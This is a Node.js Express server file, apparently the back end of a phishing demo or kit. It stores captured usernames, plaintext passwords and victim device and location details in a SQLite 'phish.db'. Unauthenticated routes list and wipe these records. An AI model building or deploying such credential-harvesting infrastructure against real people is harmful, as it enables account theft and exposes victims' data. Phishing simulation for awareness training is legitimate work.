const express = require('express');
const sqlite3 = require('sqlite3').verbose();
const path = require('path');
const fs = require('fs');
const morgan = require('morgan');

// Initialize app
const app = express();
const PORT = process.env.PORT || 3002;

// Log to console
app.use(morgan('combined'));

// Database path
const dbPath = process.env.DB || '/var/db/demo/phish.db';

// Ensure database directory exists
if (!fs.existsSync(path.dirname(dbPath))) {
    fs.mkdirSync(path.dirname(dbPath), { recursive: true });
}

// Initialize SQLite database
const db = new sqlite3.Database(dbPath, err => {
    if (err) {
        console.error('Error connecting to database:', err.message);
    } else {
        console.log('Connected to SQLite database.');
        // Ensure table exists
        db.run(
            `CREATE TABLE IF NOT EXISTS credentials (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                username TEXT NOT NULL,
                password TEXT NOT NULL,
                website TEXT NOT NULL,
                date TEXT NOT NULL,
                ip_address TEXT,
                browser TEXT,
                os TEXT,
                device TEXT,
                location TEXT
            )`,
            err => {
                if (err) {
                    console.error('Error creating table:', err.message);
                } else {
                    console.log('Table "credentials" is ready.');
                }
            }
        );
    }
});

// Middleware
app.use(express.json()); // For JSON payloads
app.use(express.urlencoded({ extended: true })); // For form submissions

// Serve static files from public folder
app.use(express.static(path.join(__dirname, 'public')));

// Routes
// Serve HTML page
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Fetch credentials
app.get('/fetch-credentials', (req, res) => {
    const query = 'SELECT * FROM credentials ORDER BY date DESC';
    db.all(query, [], (err, rows) => {
        if (err) {
            console.error('Error fetching data:', err.message);
            res.status(500).send('Error fetching data');
        } else {
            res.json(rows);
        }
    });
});

// Clear credentials
app.post('/clear-credentials', (req, res) => {

    const query = 'DELETE FROM credentials';
    db.run(query, [], function (err) {
        if (err) {
            console.error('Error deleting data:', err.message);
            res.status(500).send('Error deleting data');
        } else {
            res.json({ success: true, message: 'Credentials deleted'});
        }
    });
});

// Start the server
app.listen(PORT, () => {
    console.log(`Server is running on http://localhost:${PORT}`);
});